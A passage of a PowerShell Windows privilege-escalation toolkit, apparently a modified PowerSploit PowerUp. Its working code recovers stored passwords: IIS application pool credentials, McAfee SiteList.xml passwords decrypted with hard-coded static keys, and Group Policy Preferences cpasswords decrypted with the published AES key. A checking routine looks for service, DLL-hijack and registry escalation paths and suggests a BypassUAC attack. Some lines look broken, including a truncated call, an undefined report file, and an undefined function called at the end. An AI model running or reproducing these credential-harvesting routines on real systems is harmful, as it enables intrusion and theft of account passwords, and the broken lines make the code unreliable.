                $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
                $VdirUser = Invoke-Expression $VdirUserCmd
    
                # Get password
                $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
                $VdirPassword = Invoke-Expression $VdirPasswordCmd
    
                # Check if credentials exists
                if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                    # Add credentials to database
                    $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
                }
            }
    
            # Check if any passwords were found
            if( $DataTable.rows.Count -gt 0 ) {
                # Display results in list view that can feed into the pipeline
                $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
            }
            else {
                # Status user
                Write-Verbose 'No application pool or virtual directory passwords were found.'
                $False
            }
        }
        else {
            Write-Verbose 'Appcmd.exe does not exist in the default location.'
            $False
        }
    
        $ErrorActionPreference = $OrigError
    }
    
    
    function Get-SiteListPassword {
    <#
        .SYNOPSIS
    
            Retrieves the plaintext passwords for found McAfee's SiteList.xml files.
            Based on Jerome Nokin (@funoverip)'s Python solution (in links).
    
            PowerSploit Function: Get-SiteListPassword
            Original Author: Jerome Nokin (@funoverip)
            PowerShell Port: @harmj0y
            License: BSD 3-Clause
            Required Dependencies: None
            Optional Dependencies: None
    
        .DESCRIPTION
    
            Searches for any McAfee SiteList.xml in C:\Program Files\, C:\Program Files (x86)\,
            C:\Documents and Settings\, or C:\Users\. For any files found, the appropriate
            credential fields are extracted and decrypted using the internal Get-DecryptedSitelistPassword
            function that takes advantage of McAfee's static key encryption. Any decrypted credentials
            are output in custom objects. See links for more information.
    
        .PARAMETER Path
    
            Optional path to a SiteList.xml file or folder.
    
        .EXAMPLE
    
            PS C:\> Get-SiteListPassword
    
            EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
            UserName    :
            Path        : Products/CommonUpdater
            Name        : McAfeeHttp
            DecPassword : MyStrongPassword!
            Enabled     : 1
            DomainName  :
            Server      : update.nai.com:80
    
            EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
            UserName    : McAfeeService
            Path        : Repository$
            Name        : Paris
            DecPassword : MyStrongPassword!
            Enabled     : 1
            DomainName  : companydomain
            Server      : paris001
    
            EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
            UserName    : McAfeeService
            Path        : Repository$
            Name        : Tokyo
            DecPassword : MyStrongPassword!
            Enabled     : 1
            DomainName  : companydomain
            Server      : tokyo000
    
        .LINK
    
            https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
            https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
            https://github.com/tfairane/HackStory/blob/master/McAfeePrivesc.md
            https://www.syss.de/fileadmin/dokumente/Publikationen/2011/SySS_2011_Deeg_Privilege_Escalation_via_Antivirus_Software.pdf
    #>
    
        [CmdletBinding()]
        param(
            [Parameter(Position=0, ValueFromPipeline=$True)]
            [ValidateScript({Test-Path -Path $_ })]
            [String[]]
            $Path
        )
    
        BEGIN {
            function Local:Get-DecryptedSitelistPassword {
                # PowerShell adaptation of https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
                # Original Author: Jerome Nokin (@funoverip / jerome.nokin@gmail.com)
                # port by @harmj0y
                [CmdletBinding()]
                Param (
                    [Parameter(Mandatory=$True)]
                    [String]
                    $B64Pass
                )
    
                # make sure the appropriate assemblies are loaded
                Add-Type -Assembly System.Security
                Add-Type -Assembly System.Core
    
                # declare the encoding/crypto providers we need
                $Encoding = [System.Text.Encoding]::ASCII
                $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
                $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
    
                # static McAfee key XOR key LOL
                $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19
    
                # xor the input b64 string with the static XOR key
                $I = 0;
                $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }
    
                # build the static McAfee 3DES key TROLOL
                $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@#$%^>')) + ,0x00*4
    
                # set the options we need
                $3DES.Mode = 'ECB'
                $3DES.Padding = 'None'
                $3DES.Key = $3DESKey
    
                # decrypt the unXor'ed block
                $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)
    
                # ignore the padding for the result
                $Index = [Array]::IndexOf($Decrypted, [Byte]0)
                if($Index -ne -1) {
                    $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
                }
                else {
                    $DecryptedPass = $Encoding.GetString($Decrypted)
                }
    
                New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
            }
    
            function Local:Get-SitelistFields {
                [CmdletBinding()]
                Param (
                    [Parameter(Mandatory=$True)]
                    [String]
                    $Path
                )
    
                try {
                    [Xml]$SiteListXml = Get-Content -Path $Path
    
                    if($SiteListXml.InnerXml -Like "*password*") {
                        Write-Verbose "Potential password in found in $Path"
    
                        $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                            try {
                                $PasswordRaw = $_.Password.'#Text'
    
                                if($_.Password.Encrypted -eq 1) {
                                    # decrypt the base64 password if it's marked as encrypted
                                    $DecPassword = if($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                                }
                                else {
                                    $DecPassword = $PasswordRaw
                                }
    
                                $Server = if($_.ServerIP) { $_.ServerIP } else { $_.Server }
                                $Path = if($_.ShareName) { $_.ShareName } else { $_.RelativePath }
    
                                $ObjectProperties = @{
                                    'Name' = $_.Name;
                                    'Enabled' = $_.Enabled;
                                    'Server' = $Server;
                                    'Path' = $Path;
                                    'DomainName' = $_.DomainName;
                                    'UserName' = $_.UserName;
                                    'EncPassword' = $PasswordRaw;
                                    'DecPassword' = $DecPassword;
                                }
                                New-Object -TypeName PSObject -Property $ObjectProperties
                            }
                            catch {
                                Write-Verbose "Error parsing node : $_"
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "Error parsing file '$Path' : $_"
                }
            }
        }
    
        PROCESS {
            if($PSBoundParameters['Path']) {
                $XmlFilePaths = $Path
            }
            else {
                $XmlFilePaths = @('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\')
            }
    
            $XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
                Write-Verbose "Parsing SiteList.xml file '$($_.Fullname)'"
                Get-SitelistFields -Path $_.Fullname
            }
        }
    }
    
    
    function Get-CachedGPPPassword {
    <#
        .SYNOPSIS
    
            Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences and left in cached files on the host.
    
            PowerSploit Function: Get-CachedGPPPassword
            Author: Chris Campbell (@obscuresec), local cache mods by @harmj0y
            License: BSD 3-Clause
            Required Dependencies: None
            Optional Dependencies: None
         
        .DESCRIPTION
    
            Get-CachedGPPPassword searches the local machine for cached for groups.xml, scheduledtasks.xml, services.xml and datasources.xml files and returns plaintext passwords.
    
        .EXAMPLE
    
            PS C:\> Get-CachedGPPPassword
    
    
            NewName   : [BLANK]
            Changed   : {2013-04-25 18:36:07}
            Passwords : {Super!!!Password}
            UserNames : {SuperSecretBackdoor}
            File      : C:\ProgramData\Microsoft\Group Policy\History\{32C4C89F-7
                        C3A-4227-A61D-8EF72B5B9E42}\Machine\Preferences\Groups\Gr
                        oups.xml
    
        .LINK
            
            http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
            https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
            https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
            http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
            http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
    #>
        
        [CmdletBinding()]
        Param()
        
        # Some XML issues between versions
        Set-StrictMode -Version 2
    
        # make sure the appropriate assemblies are loaded
        Add-Type -Assembly System.Security
        Add-Type -Assembly System.Core
        
        # helper that decodes and decrypts password
        function local:Get-DecryptedCpassword {
            [CmdletBinding()]
            Param (
                [string] $Cpassword 
            )
    
            try {
                # Append appropriate padding based on string length  
                $Mod = ($Cpassword.length % 4)
                
                switch ($Mod) {
                    '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                    '2' {$Cpassword += ('=' * (4 - $Mod))}
                    '3' {$Cpassword += ('=' * (4 - $Mod))}
                }
    
                $Base64Decoded = [Convert]::FromBase64String($Cpassword)
                
                # Create a new AES .NET Crypto Object
                $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                     0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
                
                # Set IV to all nulls to prevent dynamic generation of IV value
                $AesIV = New-Object Byte[]($AesObject.IV.Length) 
                $AesObject.IV = $AesIV
                $AesObject.Key = $AesKey
                $DecryptorObject = $AesObject.CreateDecryptor() 
                [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
                
                return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
            } 
            
            catch {Write-Error $Error[0]}
        }  
        
        # helper that parses fields from the found xml preference files
        function local:Get-GPPInnerFields {
            [CmdletBinding()]
            Param (
                $File 
            )
        
            try {
                
                $Filename = Split-Path $File -Leaf
                [XML] $Xml = Get-Content ($File)
    
                $Cpassword = @()
                $UserName = @()
                $NewName = @()
                $Changed = @()
                $Password = @()
        
                # check for password field
                if ($Xml.innerxml -like "*cpassword*"){
                
                    Write-Verbose "Potential password in $File"
                    
                    switch ($Filename) {
                        'Groups.xml' {
                            $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        }
            
                        'Services.xml' {  
                            $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        }
            
                        'Scheduledtasks.xml' {
                            $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        }
            
                        'DataSources.xml' { 
                            $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
                        }
                        
                        'Printers.xml' { 
                            $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        }
      
                        'Drives.xml' { 
                            $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                            $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
                        }
                    }
               }
                         
               foreach ($Pass in $Cpassword) {
                   Write-Verbose "Decrypting $Pass"
                   $DecryptedPassword = Get-DecryptedCpassword $Pass
                   Write-Verbose "Decrypted a password of $DecryptedPassword"
                   #append any new passwords to array
                   $Password += , $DecryptedPassword
               }
                
                # put [BLANK] in variables
                if (-not $Password) {$Password = '[BLANK]'}
                if (-not $UserName) {$UserName = '[BLANK]'}
                if (-not $Changed)  {$Changed = '[BLANK]'}
                if (-not $NewName)  {$NewName = '[BLANK]'}
                      
                # Create custom object to output results
                $ObjectProperties = @{'Passwords' = $Password;
                                      'UserNames' = $UserName;
                                      'Changed' = $Changed;
                                      'NewName' = $NewName;
                                      'File' = $File}
                    
                $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
                Write-Verbose "The password is between {} and may be more than one value."
                if ($ResultsObject) {Return $ResultsObject} 
            }
    
            catch {Write-Error $Error[0]}
        }
        
        try {
            $AllUsers = $Env:ALLUSERSPROFILE
    
            if($AllUsers -notmatch 'ProgramData') {
                $AllUsers = "$AllUsers\Application Data"
            }
    
            # discover any locally cached GPP .xml files
            $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
        
            if ( -not $XMlFiles ) {
                Write-Verbose 'No preference files found.'
            }
            else {
                Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
    
                ForEach ($File in $XMLFiles) {
                    Get-GppInnerFields $File.Fullname
                }
            }
        }
    
        catch {Write-Error $Error[0]}
    }
    
    
    function Invoke-AllChecks {
    <#
        .SYNOPSIS
    
            Runs all functions that check for various Windows privilege escalation opportunities.
    
            Author: @harmj0y
            License: BSD 3-Clause
    
        .PARAMETER HTMLReport
    
            Write a HTML version of the report to SYSTEM.username.html.
    
        .EXAMPLE
    
            PS C:\> Invoke-AllChecks
    
            Runs all escalation checks and outputs a status report for discovered issues.
    
        .EXAMPLE
    
            PS C:\> Invoke-AllChecks -HTMLReport
    
            Runs all escalation checks and outputs a status report to SYSTEM.username.html
            detailing any discovered issues.
    #>
    
        [CmdletBinding()]
        Param(
            [Switch]
            $HTMLReport
        )
    
        if($HTMLReport) {
            #$HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"
    
            ConvertTo-HTML -Fragment -Pre "<H1>PowerUp Report for $($Env:ComputerName) - $($Env:UserName)</H1>`n<div class='aLine'></div>" | Out-File -Append $HtmlReportFile
        }
    
        # initial admin checks
    
        "`n[*] Running Invoke-AllChecks"
    
        $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    
        if($IsAdmin){
            "[+] Current user already has local administrative privileges!"
    
            if($HTMLReport) {
                ConvertTo-HTML -Fragment -Pre "<H2>User Has Local Admin Privileges!</H2>" | Out-File -Append $HtmlReportFile
            }
        }
        else{
            "`n`n[*] Checking if user is in a local group with administrative privileges..."
    
            $CurrentUserSids = Get-CurrentUserTokenGroupSid | Select-Object -ExpandProperty SID
            if($CurrentUserSids -contains 'S-1-5-32-544') {
                "[+] User is in a local group that grants administrative privileges!"
                "[+] Run a BypassUAC attack to elevate privileges to admin."
    
                if($HTMLReport) {
                    ConvertTo-HTML -Fragment -Pre "<H2> User In Local Group With Administrative Privileges</H2>" | Out-File -Append $HtmlReportFile
                }
            }
        }
    
    
        # Service checks
    
        "`n`n[*] Checking for unquoted service paths..."
        $Results = Get-ServiceUnquoted
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>Unquoted Service Paths</H2>" | Out-File -Append $HtmlReportFile
        }

        "`n`n[*] Checking for Current User Permissions on Services..."
        $Results = get-ser
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>Unquoted Service Paths</H2>" | Out-File -Append $HtmlReportFile
        }
    
        "`n`n[*] Checking service executable and argument permissions..."
        $Results = Get-ModifiableServiceFile
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>Service File Permissions</H2>" | Out-File -Append $HtmlReportFile
        }
    
        "`n`n[*] Checking service permissions..."
        $Results = Get-ModifiableService
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>Modifiable Services</H2>" | Out-File -Append $HtmlReportFile
        }
    
    
        # DLL hijacking
    
        "`n`n[*] Checking %PATH% for potentially hijackable DLL locations..."
        $Results = Find-PathDLLHijack
        $Results = $Results | Where-Object {$_} | Select-Object ModifiablePath, "%PATH%", Permissions, IdentityReference
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $HtmlReportFile
        }
    
    
        # registry checks
    
        "`n`n[*] Checking for AlwaysInstallElevated registry key..."
        if (Get-RegistryAlwaysInstallElevated) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'AbuseFunction' "Write-UserAddMSI"
            $Results = $Out
    
            $Results | Format-List
            if($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -Pre "<H2>AlwaysInstallElevated</H2>" | Out-File -Append $HtmlReportFile
            }
        }
    
        "`n`n[*] Checking for Autologon credentials in registry..."
        $Results = Get-RegistryAutoLogon
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>Registry Autologons</H2>" | Out-File -Append $HtmlReportFile
        }
    
    
        "`n`n[*] Checking for modifiable registry autoruns and configs..."
        $Results = Get-ModifiableRegistryAutoRun
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>Registry Autoruns</H2>" | Out-File -Append $HtmlReportFile
        }
    
        # other checks
    
        "`n`n[*] Checking for modifiable schtask files/configs..."
        $Results = Get-ModifiableScheduledTaskFile
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>Modifiable Schtask Files</H2>" | Out-File -Append $HtmlReportFile
        }
    
        "`n`n[*] Checking for unattended install files..."
        $Results = Get-UnattendedInstallFile
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>Unattended Install Files</H2>" | Out-File -Append $HtmlReportFile
        }
    
        "`n`n[*] Checking for encrypted web.config strings..."
        $Results = Get-Webconfig | Where-Object {$_}
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>Encrypted 'web.config' String</H2>" | Out-File -Append $HtmlReportFile
        }
    
        "`n`n[*] Checking for encrypted application pool and virtual directory passwords..."
        $Results = Get-ApplicationHost | Where-Object {$_}
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>Encrypted Application Pool Passwords</H2>" | Out-File -Append $HtmlReportFile
        }
    
        "`n`n[*] Checking for plaintext passwords in McAfee SiteList.xml files...."
        $Results = Get-SiteListPassword | Where-Object {$_}
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>McAfee's SiteList.xml's</H2>" | Out-File -Append $HtmlReportFile
        }
        "`n"
    
        "`n`n[*] Checking for cached Group Policy Preferences .xml files...."
        $Results = Get-CachedGPPPassword | Where-Object {$_}
        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Pre "<H2>Cached GPP Files</H2>" | Out-File -Append $HtmlReportFile
        }
        "`n"
    
        if($HTMLReport) {
            "[*] Report written to '$HtmlReportFile' `n"
        }
    }
    
    
    # PSReflect signature specifications
    $Module = New-InMemoryModule -ModuleName PowerUpModule
    
    $FunctionDefinitions = @(
        (func kernel32 GetCurrentProcess ([IntPtr]) @())
        (func advapi32 OpenProcessToken ([Bool]) @( [IntPtr], [UInt32], [IntPtr].MakeByRefType()) -SetLastError)
        (func advapi32 GetTokenInformation ([Bool]) @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
        (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
        (func advapi32 QueryServiceObjectSecurity ([Bool]) @([IntPtr], [Security.AccessControl.SecurityInfos], [Byte[]], [UInt32], [UInt32].MakeByRefType()) -SetLastError),
        (func advapi32 ChangeServiceConfig ([Bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [String], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) -SetLastError -Charset Unicode),
        (func advapi32 CloseServiceHandle ([Bool]) @([IntPtr]) -SetLastError)
    )
    
    # https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
    $ServiceAccessRights = psenum $Module PowerUp.ServiceAccessRights UInt32 @{
        QueryConfig =           '0x00000001'
        ChangeConfig =          '0x00000002'
        QueryStatus =           '0x00000004'
        EnumerateDependents =   '0x00000008'
        Start =                 '0x00000010'
        Stop =                  '0x00000020'
        PauseContinue =         '0x00000040'
        Interrogate =           '0x00000080'
        UserDefinedControl =    '0x00000100'
        Delete =                '0x00010000'
        ReadControl =           '0x00020000'
        WriteDac =              '0x00040000'
        WriteOwner =            '0x00080000'
        Synchronize =           '0x00100000'
        AccessSystemSecurity =  '0x01000000'
        GenericAll =            '0x10000000'
        GenericExecute =        '0x20000000'
        GenericWrite =          '0x40000000'
        GenericRead =           '0x80000000'
        AllAccess =             '0x000F01FF'
    } -Bitfield
    
    $SidAttributes = psenum $Module PowerUp.SidAttributes UInt32 @{
        SE_GROUP_ENABLED =              '0x00000004'
        SE_GROUP_ENABLED_BY_DEFAULT =   '0x00000002'
        SE_GROUP_INTEGRITY =            '0x00000020'
        SE_GROUP_INTEGRITY_ENABLED =    '0xC0000000'
        SE_GROUP_MANDATORY =            '0x00000001'
        SE_GROUP_OWNER =                '0x00000008'
        SE_GROUP_RESOURCE =             '0x20000000'
        SE_GROUP_USE_FOR_DENY_ONLY =    '0x00000010'
    } -Bitfield
    
    $SID_AND_ATTRIBUTES = struct $Module PowerUp.SidAndAttributes @{
        Sid         =   field 0 IntPtr
        Attributes  =   field 1 UInt32
    }
    
    $TOKEN_GROUPS = struct $Module PowerUp.TokenGroups @{
        GroupCount  = field 0 UInt32
        Groups      = field 1 $SID_AND_ATTRIBUTES.MakeArrayType() -MarshalAs @('ByValArray', 32)
    }
    
    $Types = $FunctionDefinitions | Add-Win32Type -Module $Module -Namespace 'PowerUp.NativeMethods'
    $Advapi32 = $Types['advapi32']
    $Kernel32 = $Types['kernel32']

    invoke-hostenum -All -HTMLReport
